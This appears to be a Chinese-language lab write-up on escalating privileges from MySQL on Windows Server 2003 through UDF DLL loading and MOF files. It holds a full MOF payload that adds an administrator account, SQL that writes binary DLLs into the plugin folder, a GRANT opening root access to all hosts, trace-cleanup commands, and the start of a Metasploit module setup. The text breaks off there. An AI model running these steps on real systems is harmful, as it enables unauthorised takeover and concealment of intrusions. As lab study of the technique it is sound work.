MYSQL提权

复现windows环境下的一些mysql提权方法的分析并利用

环境

靶机:Windows server 2003 enterprise edition x64

phpstudy：php：5.4.45、mysql：5.1.73

前提

因为是本地搭建的环境，所以我直接在WWW目录放了一个webshell，然后利用蚁剑连接，也是知道数据库密码的，但是因为我们已经上传了webshell所以可以去找数据库的配置文件（比如：db_config.php）得到数据库的账号跟密码，数据库一般只会允许本地连接，靶机上面也是存在phpMyAdmin，但跟习惯真机上面的Navicat所以改成也允许外部连接GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; flush privileges;

Secure_file_priv

这个参数是用来限制数据导入导出的

  • 当secure_file_priv的值为null ，表示限制mysql不允许导入导出。
  • 当secure_file_priv的值为/tmp/ ，表示限制mysql的导入导出只能发生在/tmp/目录下。
  • 当secure_file_priv的值没有具体值时，表示不对mysql的导入导出做限制。

在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件

在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

因为我这里是本地，所以修改了配置文件允许导入导出

UDF提权

UDF

UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便

动态链接库

动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用

如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下
如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录

分析

创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用

查找插件目录

我们UDF 的动态链接库放在对应的目录下面，所以我们要知道安装插件目录，上面提到如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，但是大于5.1版本的时候没有plugin这个文件夹，需要我们自己创建，我这里通过蚁剑连接webshell就可以创建了，看师傅们的博客还可以使ntfs创建目录，这里师傅们可以自己了解。

show variables like '%plugin%';
select @@basedir;
select @@plugin_dir;
//这三个可以查到mysql的目录

上传dll文件

接下来就是把udf.dll文件导入到插件目录，dll文件也是要对应MYSQL的版本，sqlmap和metsaploit中都有动态链接库，但是sqlmap中需要解码才能使用，这里我直接使用国光师傅提取的，因为phpstudy搭建的mysql是32位的，就用windows下面的32位的dll。

靶机上面已经有了对应的文件

因为dll文件是二进制文件，写入二进制文件常见的方法

SELECT 0x4d5a9000030000000... INTO DUMPFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll';#SELECT 查询十六进制写入
SELECT unhex('4d5a9000030000000...') INTO DUMPFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll';#解码十六进制写入

MOF

MOF

基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:/Windows/system32/wbem/mof/目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。

mof脚本

#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
&#123; 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
&#125;; 

instance of ActiveScriptEventConsumer as $Consumer 
&#123; 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user playzg playzg /add\")\nWSH.run(\"net.exe localgroup administrators playzg /add\")"; 
&#125;; 

instance of __FilterToConsumerBinding 
&#123; 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
&#125;;

利用webshell提权

因为我们已经用webshell连接上去，可以直接利用蚁剑将mof文件到C:/Windows/system32/wbem/mof，如果文件执行成功会创建一个playzg用户，我们看一下是否存在这个账号的信息

net user playzg查看用户

如果执行成功mof.mof文件会移动到good文件夹中，如果执行失败文件会移动到bad文件夹中

痕迹清理

这个就好像Linux的定时任务，会定时执行添加用户命令，所以我们要先关闭winmgmt服务再删除相关 mof 文件和用户才会有效果：

net stop winmgmt;# 停止 winmgmt 服务
net user hacker /delete;# 删除创建的用户
C:\Windows\system32\wbem\Repository\ # 删除 Repository 文件夹
net start winmgmt;# 重新启动服务

利用MSF进行MOF提权

找到MSF 里面自带的MOF提权模块，并且也做到了自动清理痕迹，非常方便

找到自带模块

use exploit/windows/mysql/mysql_mof# 设置好自己的 payload 和基本信息

set username root
